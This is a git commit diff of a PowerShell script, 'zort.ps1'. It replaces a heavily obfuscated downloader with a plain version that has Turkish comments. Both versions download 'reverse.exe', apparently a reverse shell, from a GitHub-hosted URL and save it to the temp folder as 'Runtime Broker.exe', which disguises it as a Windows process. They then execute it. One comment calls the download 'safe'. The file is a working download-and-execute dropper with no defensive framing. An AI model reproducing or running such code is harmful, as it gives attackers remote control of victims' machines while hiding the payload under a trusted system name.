6d8949f8d713f04896a2e47af7edc81236996681
OhioDucky <138029280+OhioDucky@users.noreply.github.com>
2024-01-26 18:37:35 +0300

    Update zort.ps1

--- zort.ps1
+++ zort.ps1
@@ -1,12 +1,12 @@
-Sv ("{1}{0}{2}" -f'4','Ew0','O6')  ([Type]("{4}{2}{0}{1}{3}"-f'N','age','vİcePOİnTmA','r','nEt.sEr') )  ; $MG9l58 =  [tyPE]("{0}{4}{3}{2}{1}" -f'neT.seC','oCOLTypE','YprOt','iT','uR')  ;    set ("{0}{1}" -f 'Uo','GTe')  ([tYPE]("{3}{1}{0}{2}" -f '.ıo','M','.PATh','SYste')) ;seT-ıtEM ("VAriABL"+"E"+":"+"uk5p")  (  [tYpE]("{3}{2}{0}{1}"-f 'TeM.I','O.paTH','s','SY')  );
-  ( VAriABLE  ("{1}{2}{0}"-f '6','Ew','04o')  ).vaLue::"Sec`U`Rİt`YPRo`ToCOL" =  $mg9L58::"tls`12"
+# TLS 1.2'yi etkinleştir
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-${U`Rl} = ("{12}{7}{16}{11}{1}{2}{14}{6}{15}{5}{0}{9}{4}{10}{8}{3}{13}" -f 'es','uc','k','ain/reverse.','ithu','sit','awsom','b.','w/m','.g','b.io/ra','om/OhioD','https://githu','exe','y/','e','c')
-${T`eMPP`ATH} =   ( gET-cHilDItEM  ("{2}{1}{0}{3}"-f'Le:UoGt','iAb','Var','E')).vAlUE::"Co`M`BinE"( $Uk5p::("{0}{3}{2}{1}"-f 'G','Path','tTemp','e').Invoke(), ("{1}{3}{2}{4}{0}" -f 'exe','R','me ','unti','Broker.'))
+$url = 'https://github.com/OhioDucky/awsomesites.github.io/raw/main/reverse.exe'
+$tempPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'Runtime Broker.exe')
 
+# Güvenli bir şekilde dosyayı indir
+$client = New-Object System.Net.WebClient
+$client.DownloadFile($url, $tempPath)
 
-${Cli`ENT} = &("{2}{0}{1}{3}"-f 'Ob','jec','New-','t') ("{4}{3}{1}{2}{0}"-f 't','e','bClien','m.Net.W','Syste')
-${Cl`i`eNT}.("{3}{0}{1}{2}" -f'dFi','l','e','Downloa').Invoke(${U`RL}, ${tEMP`P`Ath})
-
-
-.("{2}{0}{1}" -f'es','s','Start-Proc') ${t`em`PPath}
+# Dosyayı çalıştır
+Start-Process $tempPath
